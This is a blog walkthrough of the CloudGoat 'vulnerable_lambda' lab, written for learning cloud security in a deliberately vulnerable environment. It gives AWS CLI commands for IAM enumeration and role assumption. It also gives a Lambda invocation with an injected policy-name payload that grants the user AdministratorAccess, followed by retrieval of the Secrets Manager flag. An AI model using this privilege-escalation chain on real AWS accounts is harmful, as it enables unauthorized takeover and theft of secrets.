---
title:  "CloudGoat: Vulnerable Lambda"
date:   2024-03-05
tags: cloudsecurity cybersecurity aws
last_modified_at: 2024-03-08
---

CloudGoat is a cybersecurity lab which created by [Rhino Security Labs](https://rhinosecuritylabs.com/), allows you to learn about cloud cybersecurity by completing CTF scenarios. Learn more about [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat).

In this blog, I will break down each steps on the `vulnerable_lambda` scenario.
 
## Vulnerable Lambda Scenario

![Hobbit-House](/assets/images/hobbit-house.jpg)
<sub><a href="https://unsplash.com/@lucasgruwez?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">Lucas Gruwez</a> | <a href="https://unsplash.com/photos/brown-and-black-wooden-house-with-garden-ofrXUceYv40?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">Unsplash</a></sub>
{: .text-center}

In this scenario, we will play as a user name `bilbo`, try to exploit the compromised IAM role, and get the secret!

### Create bilbo profile

When we created the scenario with command `./cloudgoat.py create vulnerable_lambda`, it will give us `AccessKeyId` and `SecretAccessKey` for the `bilbo` user

After that, we can create a profile for this scenario with `bilbo` name or the name that you want. In this blog, we will stick with `bilbo`.

Create profile
```shell
aws configure --profile <profile-name-that-you-want>
```

And then it will ask for `AccessKeyId`, `SecretAccessKey`, region and format.

Done.

Additionally, I left with one command
```shell
aws configure --profile <profile-name> set aws_session_token <session-token>
```

We need this command for some steps in this scenario.

### Get permissions of the `bilbo` user

Get the `bilbo` user's permissions
```shell
aws --profile bilbo --region us-east-1 sts get-caller-identity
```

Result:
```json
{
    "UserId": "###",
    "Account": "###",
    "Arn": "arn:aws:iam::###:user/cg-bilbo-vulnerable_lambda_###"
}
```

`cg-bilbo-vulnerable_lambda_###` is the username of `bilbo` user

__Note:__ You will get the different value on `###`
{: .notice--info}


Get all attached policies of `bilbo` user
```shell
aws --profile bilbo --region us-east-1 iam list-user-policies --user-name <bilbo-user-name>
```

Result:
```json
{
    "PolicyNames": [
        "cg-bilbo-vulnerable_lambda_###-standard-user-assumer"
    ]
}
```

Now, we got all policy names that are attached to `bilbo` user. In this case we have a policy name `cg-bilbo-vulnerable_lambda_###-standard-user-assumer`

See the permission that this policy have
```shell
aws --profile bilbo --region us-east-1 iam get-user-policy --user-name <bilbo-user-name> --policy-name <policy-name>
```

Result:
```json
{
    "UserName": "cg-bilbo-vulnerable_lambda_###",
    "PolicyName": "cg-bilbo-vulnerable_lambda_###-standard-user-assumer",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "sts:AssumeRole",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::###:role/cg-lambda-invoker*",
                "Sid": ""
            },
            {
                "Action": [
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": ""
            }
        ]
    }
}
```

With this policy, the `bilbo` user has role `cg-lambda-invoker*` and the permission to get and list everything in IAM, and able to use the IAM policy simulator.

#### Time to think
Now we know that the `bilbo` user have one role `cg-lambda-invoker*`, so we will explore more about this role.

### List all roles

```shell
aws --profile bilbo --region us-east-1 iam list-roles | grep cg-
```

The command above will list all the roles in the account, but we are only interested in the role that relates to `bilbo` user, so we pipe with command `grep cg-` to find our target role `cg-lambda-invoker*`.

Result:
```
"RoleName": "cg-lambda-invoker-vulnerable_lambda_###",
"Arn": "arn:aws:iam::###:role/cg-lambda-invoker-vulnerable_lambda_###",
"AWS": "arn:aws:iam::###:user/cg-bilbo-vulnerable_lambda_###"
```

Now, we got the target role name `cg-lambda-invoker-vulnerable_lambda_###` with arn `arn:aws:iam::###:role/cg-lambda-invoker-vulnerable_lambda_###`

We will see the attached policy with 
```shell
aws --profile bilbo --region us-east-1 iam list-role-policies --role-name <cg-target-role>
```

Result:
```json
{
    "PolicyNames": [
        "lambda-invoker"
    ]
}
```

We got the policy name `lambda-invoker` which is attached to the target role `cg-lambda-invoker-vulnerable_lambda_###`

See the permission of this policy
```shell
aws --profile bilbo --region us-east-1 iam get-role-policy --role-name <role-name> --policy-name <policy-name>
```

Result:
```json
{
    "RoleName": "cg-lambda-invoker-###",
    "PolicyName": "lambda-invoker",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "lambda:ListFunctionEventInvokeConfigs",
                    "lambda:InvokeFunction",
                    "lambda:ListTags",
                    "lambda:GetFunction",
                    "lambda:GetPolicy"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:lambda:us-east-1:###:function:###-policy_applier_lambda1"
            },
            {
                "Action": [
                    "lambda:ListFunctions",
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*"
            }
        ]
    }
}
```

The role `cg-lambda-invoker-###` can list all lambda functions (`lambda:ListFunctions`) in the account, and get function (`lambda:GetFunction`) which has arn `arn:aws:lambda:us-east-1:###:function:###-policy_applier_lambda1`

#### Time to think
Now, we know the `bilbo` user have a role `cg-lambda-invoker-###`. With this role, we can list all lambdas functions in the account, and able to get the `###-policy_applier_lambda1` function, which means get the source code of this function. 

The exploitation starts here.

We cannot get function with the `bilbo` user directly because the `bilbo` user does not have permission to do that, but the `bilbo` user have a role `cg-lambda-invoker-###`. So we will get credential of this role and take a privilege that this role have to get the source code.

Get the credential from this role
```shell
aws --profile bilbo --region us-east-1 sts assume-role --role-arn <role-arn> --role-session-name <whatever-session-name-you-want>
```

You will get the `AccessKeyId`, `SecretAccessKey`, and `SessionToken`
```json
{
    "Credentials": {
        "AccessKeyId": "###",
        "SecretAccessKey": "###",
        "SessionToken": "###",
        "Expiration": "2024-03-07T09:44:04+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "###:lambda-session",
        "Arn": "arn:aws:sts::###:assumed-role/cg-lambda-invoker-vulnerable_lambda_###/lambda-session"
    }
}
```

Now, we will create new profile for this assumed role.

See the profile creating above, and do not forget to set the session token in the profile.

### List lambdas to identify the target lambda

Now, we got assumed role profile.

To confirm that we have the function that we want in this account, we can use our new assumed role profile to list all lambda functions with
```shell
aws --profile <assumed-role-profile> --region us-east-1 lambda list-functions
```

Result:
```json
{
    "Functions": [
        {
            "FunctionName": "vulnerable_lambda_###-policy_applier_lambda1",
            "FunctionArn": "arn:aws:lambda:us-east-1:291364365093:function:vulnerable_lambda_###-policy_applier_lambda1"
        }
    ]
}
```

We got the function name `vulnerable_lambda_###-policy_applier_lambda1` which had arn `arn:aws:lambda:us-east-1:291364365093:function:vulnerable_lambda_###-policy_applier_lambda1`

### Look at the target lambda source code

Get our target lambda source code, you need to run
```shell
aws --profile assumed_role --region us-east-1 lambda get-function --function-name <function-name-or-function-arn>
```

Result:
```json
{
    "Configuration": {
        "FunctionName": "vulnerable_lambda_###-policy_applier_lambda1",
        "FunctionArn": "arn:aws:lambda:us-east-1:###:function:vulnerable_lambda_###-policy_applier_lambda1"
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "s3 link to download source code"
    }
}
```

We will get link to download source code on the `Location` key.

#### Time to think
From the function code, we know that this function can attach any policies to any user in the account, so we will use this compromised code to attach the administator policy to `bilbo` user which allows to do whatever we want in the account.

### Invoke administrator policy to `bilbo` user

Invoke the lambda to attached administrator access policy to `bilbo`, you need to run
```shell
aws --profile assumed_ld_invoker --region us-east-1 lambda invoke --function-name <function-name> --cli-binary-format raw-in-base64-out --payload '{"policy_names": ["AdministratorAccess'"'"' --"], "user_name": "<bilbo-user-name>"}' <file-name-you-want>.txt
```

See the output,
```shell
cat <file-name-you-want>.txt
```

Confirm that `bilbo` user got the `AdministratorAccess` policy,
```shell
aws --profile bilbo --region us-east-1 iam list-attached-user-policies --user-name <bilbo-user-name>
```

Result:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

### Get secret!

List all the secrets the account have
```shell
aws --profile bilbo --region us-east-1 secretsmanager list-secrets
```

Result:
```json
{
    "SecretList": [
        {
            "Name": "vulnerable_lambda_###-final_flag",
        }
    ]
}
```
We found a secret name `vulnerable_lambda_###-final_flag`

Get the secret value
```shell
aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id <secret-name>
```

Result:
```json
{
    "SecretString": "cg-secret-XXXXXX-XXXXXX"
}
```

Finally, we made it!

__Warning:__ Do not forget to delete scenario with `./cloudgoat.py destroy vulnerable_lambda`, when you are done.
{: .notice--warning}